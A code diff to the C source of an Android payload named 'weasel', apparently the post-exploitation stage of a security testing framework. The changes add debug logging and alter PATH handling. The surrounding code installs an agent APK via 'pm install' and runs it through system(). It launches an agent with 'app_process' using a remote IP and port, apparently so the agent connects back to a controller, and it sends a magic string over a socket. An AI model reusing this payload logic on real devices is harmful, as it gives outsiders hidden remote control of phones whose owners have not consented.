@@ -17,6 +17,7 @@ bool privileged_weasel()
     const char* pmString = "pm install %s/agent.apk";
     char* pmCommand = malloc(strlen(pmString) - 2 + strlen(dir) + 1);
     sprintf(pmCommand, pmString, dir);
+    debug("weasel", pmCommand);
     system(pmCommand);
     
     /* Get SDK version from SystemProperties */
@@ -87,7 +88,7 @@ bool sneaky_weasel()
     setenv("CLASSPATH", jarFilePath, 1);
     execPath = malloc(snprintf(NULL, 0, "exec app_process %s %s %s %s", dir, execClass, ip, port) + 1);
     sprintf(execPath, "exec app_process %s %s %s %s", dir, execClass, ip, port);
-    debug("system()", "Hold thumbs...we are attempting to run it...");
+    debug("weasel_system()", execPath);
     system(execPath);
     
     /* If this is reached it means that the app image was not replaced with that of agent.jar */
@@ -115,9 +116,9 @@ bool defeated_weasel()
     send(s, magic, strlen(magic), 0);
     
     /* Add current folder to PATH */
-    char *standardPath = "/system/bin:/system/xbin";
-    char *newPath = malloc(strlen(standardPath) + 1 + strlen(dir) + 1);
-    strncpy(newPath, standardPath, strlen(standardPath));
+    char *originalPath = getenv("PATH");
+    char *newPath = malloc(strlen(originalPath) + 1 + strlen(dir) + 1);
+    strncpy(newPath, originalPath, strlen(originalPath));
     strcat(newPath, ":");
     strcat(newPath, dir);
     setenv("PATH", newPath, 1);
